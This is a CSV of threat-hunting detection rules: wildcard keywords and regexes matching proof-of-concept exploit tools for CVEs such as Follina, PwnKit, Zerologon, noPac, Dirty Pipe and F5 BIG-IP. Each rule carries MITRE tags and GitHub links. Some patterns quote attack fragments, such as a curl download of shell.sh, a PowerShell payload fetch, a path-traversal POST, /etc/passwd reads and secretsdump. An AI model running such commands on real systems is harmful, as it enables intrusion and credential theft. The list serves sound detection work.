"keyword","metadata_keyword_regex","metadata_keyword_type","metadata_tool","metadata_description","metadata_tool_techniques","metadata_tool_tactics","metadata_malwares_name","metadata_groups_name","metadata_category","metadata_link","metadata_enable_endpoint_detection","metadata_enable_proxy_detection","metadata_comment","metadata_severity_score","metadata_popularity_score","metadata_github_stars","metadata_github_forks","metadata_github_updated_at","metadata_github_created_at"
"*onecloudemoji/CVE-2022-30190*",".{0,1000}onecloudemoji\/CVE\-2022\-30190.{0,1000}","offensive_tool_keyword","POC","CVE-2022-30190 Follina POC","T1190 - T1203 - T1068 - T1210","TA0001 - TA0002 - TA0005 - TA0006","N/A","N/A","Exploitation tools","https://github.com/onecloudemoji/CVE-2022-30190","1","1","N/A","N/A","2","106","33","2022-05-31T09:35:37Z","2022-05-31T06:45:25Z"
"*payload.c *",".{0,1000}payload\.c\s.{0,1000}","offensive_tool_keyword","POC","Exploit for the pwnkit vulnerability (https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) from the Qualys team","T1068","TA0004","N/A","N/A","Exploitation tools","https://github.com/Ayrx/CVE-2021-4034","1","0","N/A","N/A","1","96","14","2022-01-27T11:57:05Z","2022-01-26T03:33:47Z"
"*--payload-url */pwn.html",".{0,1000}\-\-payload\-url\s.{0,1000}\/pwn\.html","offensive_tool_keyword","POC","Just another PoC for the new MSDT-Exploit","T1190 - T1203 - T1068 - T1210","TA0001 - TA0002 - TA0005 - TA0006","N/A","N/A","Exploitation tools","https://github.com/ItsNee/Follina-CVE-2022-30190-POC","1","0","N/A","N/A","1","5","0","2022-07-04T13:27:13Z","2022-06-05T13:54:04Z"
"*plummm/CVE-2022-27666*",".{0,1000}plummm\/CVE\-2022\-27666.{0,1000}","offensive_tool_keyword","POC","Exploit for CVE-2022-27666","T1550 - T1555 - T1212 - T1558","TA0005","N/A","N/A","Exploitation tools","https://github.com/plummm/CVE-2022-27666","1","1","N/A","N/A","3","204","44","2022-03-28T18:21:00Z","2022-03-23T22:54:28Z"
"*poc.bash*",".{0,1000}poc\.bash.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.bat*",".{0,1000}poc\.bat.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.bin*",".{0,1000}poc\.bin.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.exe*",".{0,1000}poc\.exe.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.msi*",".{0,1000}poc\.msi.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.pl*",".{0,1000}poc\.pl.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.ps1*",".{0,1000}poc\.ps1.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.reg*",".{0,1000}poc\.reg.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.run*",".{0,1000}poc\.run.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.sh*",".{0,1000}poc\.sh.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.vb*",".{0,1000}poc\.vb.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.vbe*",".{0,1000}poc\.vbe.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.vbs*",".{0,1000}poc\.vbs.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.vbscript*",".{0,1000}poc\.vbscript.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*poc.zsh*",".{0,1000}poc\.zsh.{0,1000}","offensive_tool_keyword","POC","CVE POCs exploits executables ","T1068 - T1203 - T1059.003","TA0002 - TA0005 - TA0040","N/A","N/A","Exploitation tools","https://github.com/lcashdol/Exploits","1","0","N/A","N/A","3","210","75","2020-07-14T15:41:00Z","2015-02-16T20:06:37Z"
"*POST */tmui/login.jsp/.. /tmui/locallb/workspace/fileSave.jsp*",".{0,1000}POST\s.{0,1000}\/tmui\/login\.jsp\/\.\.\s\/tmui\/locallb\/workspace\/fileSave\.jsp.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://github.com/jas502n/CVE-2020-5902","1","0","N/A","N/A","4","371","112","2021-10-13T07:53:46Z","2020-07-05T16:38:32Z"
"*POST *fileName=/tmp/1.txt&content=CVE-2020-5902*",".{0,1000}POST\s.{0,1000}fileName\=\/tmp\/1\.txt\&content\=CVE\-2020\-5902.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://github.com/jas502n/CVE-2020-5902","1","0","N/A","N/A","4","371","112","2021-10-13T07:53:46Z","2020-07-05T16:38:32Z"
"*powershell Invoke-WebRequest ""http://0.0.0.0:8001/test.exe*",".{0,1000}powershell\sInvoke\-WebRequest\s\""http\:\/\/0\.0\.0\.0\:8001\/test\.exe.{0,1000}","offensive_tool_keyword","POC","Achieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)","T1190 - T1059 - T1071 - T1105 - T1041","TA0001 - TA0002 - TA0009 - TA0011 - TA0010","N/A","N/A","Exploitation tools","https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ","1","1","N/A","9","1","88","31","2024-01-20T16:59:23Z","2023-11-03T22:06:09Z"
"*ptresearch/AttackDetection*",".{0,1000}ptresearch\/AttackDetection.{0,1000}","offensive_tool_keyword","POC","POC exploits - The Attack Detection Team searches for new vulnerabilities and 0-days. reproduces it and creates PoC exploits to understand how these security flaws work and how related attacks can be detected on the network layer. Additionally. we are interested in malware and hackers TTPs. so we develop Suricata rules for detecting all sorts of such activities.","T1210 - T1583 - T1586 - T1589 - T1596","TA0002 - TA0011 - TA0007","N/A","N/A","Exploitation tools","https://github.com/ptresearch/AttackDetection","1","1","N/A","N/A","10","1301","357","2022-08-31T09:26:21Z","2016-03-24T14:42:50Z"
"*pwnkit *",".{0,1000}pwnkit\s.{0,1000}","offensive_tool_keyword","POC","Exploit for the pwnkit vulnerability (https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) from the Qualys team","T1068","TA0004","N/A","N/A","Exploitation tools","https://github.com/Ayrx/CVE-2021-4034","1","0","N/A","N/A","1","96","14","2022-01-27T11:57:05Z","2022-01-26T03:33:47Z"
"*pwnkit64decoded.c*",".{0,1000}pwnkit64decoded\.c.{0,1000}","offensive_tool_keyword","POC","exploitation of CVE-2021-4034","T1210","N/A","N/A","N/A","Exploitation tools","https://github.com/luijait/PwnKit-Exploit","1","1","N/A","N/A","1","81","15","2022-02-07T15:42:00Z","2022-01-26T18:01:26Z"
"*pyhon3 poc.py * curl http://*/shell.sh -o /tmp/shell.sh*",".{0,1000}pyhon3\spoc\.py\s.{0,1000}\scurl\shttp\:\/\/.{0,1000}\/shell\.sh\s\-o\s\/tmp\/shell\.sh.{0,1000}","offensive_tool_keyword","POC","Automated PoC exploitation of CVE-2021-44521","T1548 - T1190","TA0006 - TA0008","N/A","N/A","Exploitation tools","https://github.com/QHpix/CVE-2021-44521","1","0","N/A","N/A","1","9","2","2022-02-24T12:04:40Z","2022-02-24T11:07:34Z"
"*python noPac.*",".{0,1000}python\snoPac\..{0,1000}","offensive_tool_keyword","POC","POC exploitation for CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user","T1548 - T1134 - T1078 - T1078.002","TA0004 ","N/A","N/A","Exploitation tools","https://github.com/Ridter/noPac","1","0","N/A","N/A","7","690","114","2023-01-29T03:31:27Z","2021-12-13T10:28:12Z"
"*r2pm -i dirtycow*",".{0,1000}r2pm\s\-i\sdirtycow.{0,1000}","offensive_tool_keyword","POC","POC exploitation for dirtycow vulnerability","T1543","TA0003 - TA0004","N/A","N/A","Exploitation tools","https://github.com/nowsecure/dirtycow","1","0","N/A","N/A","1","92","30","2019-05-13T13:17:31Z","2016-10-22T14:00:37Z"
"*RCE-exploits*",".{0,1000}RCE\-exploits.{0,1000}","offensive_tool_keyword","POC","poc rce - The exploit samples database is a repository for RCE (remote code execution) exploits and Proof-of-Concepts for WINDOWS. the samples are uploaded for education purposes for red and blue teams.","T1059.001 - T1210.001 - T1212 - T1055.012","TA0002 - TA0007 - TA0008","N/A","N/A","Exploitation tools","https://github.com/smgorelik/Windows-RCE-exploits","1","1","N/A","N/A","8","737","188","2023-12-11T22:30:33Z","2018-02-13T11:23:40Z"
"*reinstall_original_pw.py*",".{0,1000}reinstall_original_pw\.py.{0,1000}","offensive_tool_keyword","POC","Zerologon CVE exploitation","T1210 - T1068","TA0001","N/A","N/A","Exploitation tools","https://github.com/risksense/zerologon","1","1","N/A","N/A","6","574","147","2020-10-15T18:31:15Z","2020-09-14T19:19:07Z"
"*renameMachine.py -current-name * -new-name*",".{0,1000}renameMachine\.py\s\-current\-name\s.{0,1000}\s\-new\-name.{0,1000}","offensive_tool_keyword","POC","POC exploitation for CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user","T1078.001 - T1078.002 - T1059.003 - T1059.001 - T1053.005 - T1021.001 - T1003.001 - T1003.002 - T1003.004 - T1001.001 ","TA0006 - TA0007 - TA0008 - TA0009","N/A","N/A","Exploitation tools","https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing","1","0","N/A","N/A","N/A","N/A","N/A","N/A","N/A"
"*rm -f *.o dump_vdso test_payload*",".{0,1000}rm\s\-f\s.{0,1000}\.o\sdump_vdso\stest_payload.{0,1000}","offensive_tool_keyword","POC","POC exploitation for dirtycow vulnerability","T1543","TA0003 - TA0004","N/A","N/A","Exploitation tools","https://github.com/timwr/CVE-2016-5195","1","0","N/A","N/A","10","941","392","2021-02-03T16:03:40Z","2016-10-21T11:19:21Z"
"*Root backdoor obtained!*",".{0,1000}Root\sbackdoor\sobtained\!.{0,1000}","offensive_tool_keyword","POC","This is a PoC for Nimbuspwn a Linux privilege escalation issue identified by Microsoft as originally described in https://www.microsoft.com/security/blog/2022/04/26/microsoft-finds-new-elevation-of-privilege-linux-vulnerability-nimbuspwn/ (CVE-2022-29799 and CVE-2022-29800)","T1543","TA0003","N/A","N/A","Exploitation tools","https://github.com/Immersive-Labs-Sec/nimbuspwn","1","0","N/A","N/A","1","22","6","2022-05-05T10:02:27Z","2022-04-27T13:04:33Z"
"*rpcrt4_new.dll*",".{0,1000}rpcrt4_new\.dll.{0,1000}","offensive_tool_keyword","POC","Remote Code Execution Exploit in the RPC Library CVE-2022-26809","T1190 - T1203 - T1068 - T1210","TA0001 - TA0002 - TA0005 - TA0006","N/A","N/A","Exploitation tools","https://github.com/websecnl/CVE-2022-26809","1","1","N/A","N/A","1","30","6","2022-04-19T17:04:04Z","2022-04-14T08:12:24Z"
"*rpcrt4_old.dll",".{0,1000}rpcrt4_old\.dll","offensive_tool_keyword","POC","Remote Code Execution Exploit in the RPC Library CVE-2022-26809","T1190 - T1203 - T1068 - T1210","TA0001 - TA0002 - TA0005 - TA0006","N/A","N/A","Exploitation tools","https://github.com/websecnl/CVE-2022-26809","1","1","N/A","N/A","1","30","6","2022-04-19T17:04:04Z","2022-04-14T08:12:24Z"
"*ruby CVE-202*-*.rb *",".{0,1000}ruby\sCVE\-202.{0,1000}\-.{0,1000}\.rb\s.{0,1000}","offensive_tool_keyword","POC","CVE-2023-34362: MOVEit Transfer Unauthenticated RCE","T1190.001 - T1210.002 - T1068 - T1059.001 - T1059.003","TA0005 - TA0001 - TA0002 - TA0043","N/A","N/A","Exploitation tools","https://github.com/sfewer-r7/CVE-2023-34362","1","0","N/A","N/A","1","62","23","2023-06-13T08:46:03Z","2023-06-12T12:56:12Z"
"*ruby poc-cve-202*-*.rb*",".{0,1000}ruby\spoc\-cve\-202.{0,1000}\-.{0,1000}\.rb.{0,1000}","offensive_tool_keyword","POC","CVE-2023-34362: MOVEit Transfer Unauthenticated RCE","T1190.001 - T1210.002 - T1068 - T1059.001 - T1059.003","TA0005 - TA0001 - TA0002 - TA0043","N/A","N/A","Exploitation tools","https://github.com/sfewer-r7/CVE-2023-34362","1","0","N/A","N/A","1","62","23","2023-06-13T08:46:03Z","2023-06-12T12:56:12Z"
"*Running the exploit be patient................................*",".{0,1000}Running\sthe\sexploit\sbe\spatient\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..{0,1000}","offensive_tool_keyword","POC","Exploit tool for CVE-2023-4911 targeting the 'Looney Tunables' glibc vulnerability in various Linux distributions.","T1068 - T1210 - T1555","TA0001 - TA0003 - TA0005","N/A","N/A","Exploitation tools","https://github.com/chaudharyarjun/LooneyPwner","1","0","N/A","10","1","38","12","2023-10-18T04:59:50Z","2023-10-17T07:44:16Z"
"*S4U2self.py*",".{0,1000}S4U2self\.py.{0,1000}","offensive_tool_keyword","POC","script used in the POC exploitation for CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user","T1548 - T1134 - T1078 - T1078.002","TA0004 ","N/A","N/A","Exploitation tools","https://github.com/Ridter/noPac","1","0","N/A","N/A","7","690","114","2023-01-29T03:31:27Z","2021-12-13T10:28:12Z"
"*scumjr*dirtycow-vdso*",".{0,1000}scumjr.{0,1000}dirtycow\-vdso.{0,1000}","offensive_tool_keyword","POC","POC exploitation for dirtycow vulnerability","T1543","TA0003 - TA0004","N/A","N/A","Exploitation tools","https://github.com/timwr/CVE-2016-5195","1","1","N/A","N/A","10","941","392","2021-02-03T16:03:40Z","2016-10-21T11:19:21Z"
"*secretsdump*",".{0,1000}secretsdump.{0,1000}","offensive_tool_keyword","POC","Zerologon CVE exploitation (could be other malicious tools too)","T1210 - T1068","TA0001","N/A","N/A","Exploitation tools","https://github.com/risksense/zerologon","1","1","N/A","N/A","6","574","147","2020-10-15T18:31:15Z","2020-09-14T19:19:07Z"
"*secretsdump.py*",".{0,1000}secretsdump\.py.{0,1000}","offensive_tool_keyword","POC","script used in the POC exploitation for CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user","T1548 - T1134 - T1078 - T1078.002","TA0004 ","N/A","N/A","Exploitation tools","https://github.com/Ridter/noPac","1","0","N/A","N/A","7","690","114","2023-01-29T03:31:27Z","2021-12-13T10:28:12Z"
"*Send-CalendarNTLMLeak *",".{0,1000}Send\-CalendarNTLMLeak\s.{0,1000}","offensive_tool_keyword","POC","CVE-2023-23397 POC Powershell exploit","T1068 - T1557.001 - T1187 - T1212 -T1003.001 - T1550","TA0003 - TA0002 - TA0004","N/A","N/A","Exploitation tools","https://github.com/api0cradle/CVE-2023-23397-POC-Powershell","1","0","N/A","N/A","4","340","63","2023-03-17T07:47:40Z","2023-03-16T19:43:39Z"
"*set_empty_pw.py*",".{0,1000}set_empty_pw\.py.{0,1000}","offensive_tool_keyword","POC","Zerologon CVE exploitation","T1210 - T1068","TA0001","N/A","N/A","Exploitation tools","https://github.com/risksense/zerologon","1","1","N/A","N/A","6","574","147","2020-10-15T18:31:15Z","2020-09-14T19:19:07Z"
"*shellcode.asm*",".{0,1000}shellcode\.asm.{0,1000}","offensive_tool_keyword","POC","CVE-2022-21882 win32k LPE bypass CVE-2021-1732","T1068","TA0004","N/A","N/A","Exploitation tools","https://github.com/KaLendsi/CVE-2022-21882","1","0","N/A","N/A","5","458","141","2022-01-27T04:18:18Z","2022-01-27T03:44:10Z"
"*SimoneLazzaris/ditty*",".{0,1000}SimoneLazzaris\/ditty.{0,1000}","offensive_tool_keyword","POC","POC exploitation for dirty pipe vulnerability","T1543","TA0003 - TA0004","N/A","N/A","Exploitation tools","https://github.com/SimoneLazzaris/ditty","1","1","N/A","N/A","1","2","1","2022-03-10T16:15:14Z","2022-03-09T09:20:27Z"
"*spawn_cmd.dll*",".{0,1000}spawn_cmd\.dll.{0,1000}","offensive_tool_keyword","POC","POC to check for CVE-2020-0796 /SMBGhost Expected outcome: cmd.exe launched with system access","T1210.001 - T1213 - T1212 - T1201","TA0007 - TA0002","N/A","N/A","Exploitation tools","https://github.com/ZecOps/CVE-2020-0796-LPE-POC","1","1","N/A","N/A","3","242","90","2020-04-02T08:01:38Z","2020-03-30T16:06:50Z"
"*Spel_RCE_Bash_EXP.py*",".{0,1000}Spel_RCE_Bash_EXP\.py.{0,1000}","offensive_tool_keyword","POC","RCE PoC of 0-day Vulnerability found in Spring Cloud (SPEL)","T1059 - T1210 - T1507","TA0002 - TA0040 - TA0043","N/A","N/A","Exploitation tools","https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE","1","1","N/A","N/A","N/A","N/A","N/A","N/A","N/A"
"*Spel_RCE_POC.py*",".{0,1000}Spel_RCE_POC\.py.{0,1000}","offensive_tool_keyword","POC","RCE PoC of 0-day Vulnerability found in Spring Cloud (SPEL)","T1059 - T1210 - T1507","TA0002 - TA0040 - TA0043","N/A","N/A","Exploitation tools","https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE","1","1","N/A","N/A","","N/A","","",""
"*sploitus.com/exploit?id=6C1081C5-7938-5E83-9079-719C1B071FB5*",".{0,1000}sploitus\.com\/exploit\?id\=6C1081C5\-7938\-5E83\-9079\-719C1B071FB5.{0,1000}","offensive_tool_keyword","POC","Automated PoC exploitation of CVE-2021-44521","T1548 - T1190","TA0006 - TA0008","N/A","N/A","Exploitation tools","https://github.com/QHpix/CVE-2021-44521","1","1","N/A","N/A","1","9","2","2022-02-24T12:04:40Z","2022-02-24T11:07:34Z"
"*Spring-cloud-function-SpEL-RCE*",".{0,1000}Spring\-cloud\-function\-SpEL\-RCE.{0,1000}","offensive_tool_keyword","POC","RCE PoC of 0-day Vulnerability found in Spring Cloud (SPEL)","T1059 - T1210 - T1507","TA0002 - TA0040 - TA0043","N/A","N/A","Exploitation tools","https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE","1","1","N/A","N/A","","N/A","","",""
"*springFramework_CVE-2022-22965_RCE.py*",".{0,1000}springFramework_CVE\-2022\-22965_RCE\.py.{0,1000}","offensive_tool_keyword","POC","SpringFramework CVE-2022-22965","T1550 - T1555 - T1212 - T1558","TA0001 - TA0004 - TA0006","N/A","N/A","Exploitation tools","https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE","1","0","N/A","N/A","1","76","17","2022-04-01T12:08:45Z","2022-04-01T04:51:44Z"
"*su rootz*",".{0,1000}su\srootz.{0,1000}","offensive_tool_keyword","POC","POC exploitation for dirty pipe vulnerability","T1204 - T1055 - T1003 - T1015 - T1068 - T1059 - T1047","TA0001 - TA0002 - TA0003 - TA0008","N/A","N/A","Exploitation tools","https://github.com/ahrixia/CVE_2022_0847","1","0","N/A","N/A","1","22","15","2022-03-08T13:15:35Z","2022-03-08T12:43:43Z"
"*SunloginClient_11.0.0.33162_X64.exe*",".{0,1000}SunloginClient_11\.0\.0\.33162_X64\.exe.{0,1000}","offensive_tool_keyword","POC","SunloginClient RCE vulnerable version","T1587","TA0001 - TA0003 - TA0009","N/A","N/A","Exploitation tools","https://github.com/Mr-xn/sunlogin_rce","1","1","N/A","N/A","5","473","198","2022-02-16T16:11:42Z","2022-02-16T14:20:41Z"
"*-t * -x lfr -f /etc/passwd*",".{0,1000}\-t\s.{0,1000}\s\-x\slfr\s\-f\s\/etc\/passwd.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://github.com/dunderhay/CVE-2020-5902","1","0","N/A","N/A","1","37","8","2024-01-06T03:27:59Z","2020-07-06T04:03:58Z"
"*-t * -x rce -a list+auth+user+admin*",".{0,1000}\-t\s.{0,1000}\s\-x\srce\s\-a\slist\+auth\+user\+admin.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://github.com/dunderhay/CVE-2020-5902","1","0","N/A","N/A","1","37","8","2024-01-06T03:27:59Z","2020-07-06T04:03:58Z"
"*targetver.h*",".{0,1000}targetver\.h.{0,1000}","offensive_tool_keyword","POC","CVE-2022-21882 win32k LPE bypass CVE-2021-1732","T1068","TA0004","N/A","N/A","Exploitation tools","https://github.com/KaLendsi/CVE-2022-21882","1","0","N/A","N/A","5","458","141","2022-01-27T04:18:18Z","2022-01-27T03:44:10Z"
"*vmware_vrni_rce_cve_2023_20887.rb*",".{0,1000}vmware_vrni_rce_cve_2023_20887\.rb.{0,1000}","offensive_tool_keyword","POC","VMWare vRealize Network Insight Pre-Authenticated RCE (CVE-2023-20887)","T1068 - T1190.001 - T1210.002 - T1059.001 - T1059.003 - T1190 - T1569.002","TA0005 - TA0002 - TA0001 - TA0040 - TA0043","N/A","N/A","Exploitation tools","https://github.com/sinsinology/CVE-2023-20887","1","1","N/A","N/A","3","223","46","2023-06-13T14:39:17Z","2023-06-13T13:17:23Z"
"*vmware_workspace_one_access_cve_*.rb",".{0,1000}vmware_workspace_one_access_cve_.{0,1000}\.rb","offensive_tool_keyword","POC","POC for VMWARE CVE-2022-22954","T1190 - T1203 - T1068 - T1210","TA0001 - TA0002 - TA0005 - TA0006","N/A","N/A","Exploitation tools","https://github.com/rapid7/metasploit-framework/blob/62bfe03b50a22785b59a069319520531f2663b2b/modules/exploits/linux/http/vmware_workspace_one_access_cve_2022_22954.rb","1","1","N/A","N/A","10","32397","13560","2024-02-29T09:40:52Z","2011-08-30T06:13:20Z"
"*WazeHell/sam-the-admin*",".{0,1000}WazeHell\/sam\-the\-admin.{0,1000}","offensive_tool_keyword","POC","POC exploitation for CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user","T1548 - T1134 - T1078.002 - T1078","TA0003 - TA0008 - TA0002","N/A","N/A","Exploitation tools","https://github.com/WazeHell/sam-the-admin/tree/main/utils","1","1","N/A","N/A","10","950","193","2022-07-10T22:23:13Z","2021-12-11T15:10:30Z"
"*wget *http-vuln-cve2020-5902.nse*",".{0,1000}wget\s.{0,1000}http\-vuln\-cve2020\-5902\.nse.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://gist.github.com/cihanmehmet/07d2f9dac55f278839b054b8eb7d4cc5","1","0","N/A","N/A","N/A","N/A","N/A","N/A","N/A"
"*while * do mv *GCONV_PATH=./value* done",".{0,1000}while\s.{0,1000}\sdo\smv\s.{0,1000}GCONV_PATH\=\.\/value.{0,1000}\sdone","offensive_tool_keyword","POC","Exploit for the pwnkit vulnerability (https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) from the Qualys team","T1068","TA0004","N/A","N/A","Exploitation tools","https://github.com/Ayrx/CVE-2021-4034 ","1","0","N/A","N/A","1","96","14","2022-01-27T11:57:05Z","2022-01-26T03:33:47Z"
"*windows10_ntfs_crash_dos*",".{0,1000}windows10_ntfs_crash_dos.{0,1000}","offensive_tool_keyword","POC","PoC for a NTFS crash that I discovered. in various Windows versions Type of issue: denial of service. One can generate blue-screen-of-death using a handcrafted NTFS image. This Denial of Service type of attack. can be driven from user mode. limited user account or Administrator. It can even crash the system if it is in locked state.","T1499.002 - T1059.001 - T1538.002","TA0002 - TA0007 - TA0008","N/A","N/A","DDOS","https://github.com/mtivadar/windows10_ntfs_crash_dos","1","1","N/A","N/A","6","591","136","2020-04-28T18:11:52Z","2018-04-27T19:31:59Z"
"*write_what_where.py*",".{0,1000}write_what_where\.py.{0,1000}","offensive_tool_keyword","POC","POC to check for CVE-2020-0796 / SMBGhost","T1210.001 - T1213 - T1212 - T1201","TA0007 - TA0002","N/A","N/A","Exploitation tools","https://github.com/ZecOps/CVE-2020-0796-LPE-POC","1","1","N/A","N/A","3","242","90","2020-04-02T08:01:38Z","2020-03-30T16:06:50Z"
"*yasserjanah/CVE-2020-5902*",".{0,1000}yasserjanah\/CVE\-2020\-5902.{0,1000}","offensive_tool_keyword","POC","exploit code for F5-Big-IP (CVE-2020-5902)","T1210","TA0008","N/A","N/A","Exploitation tools","https://github.com/yasserjanah/CVE-2020-5902","1","1","N/A","N/A","1","38","14","2023-05-22T23:32:39Z","2020-07-06T01:12:23Z"
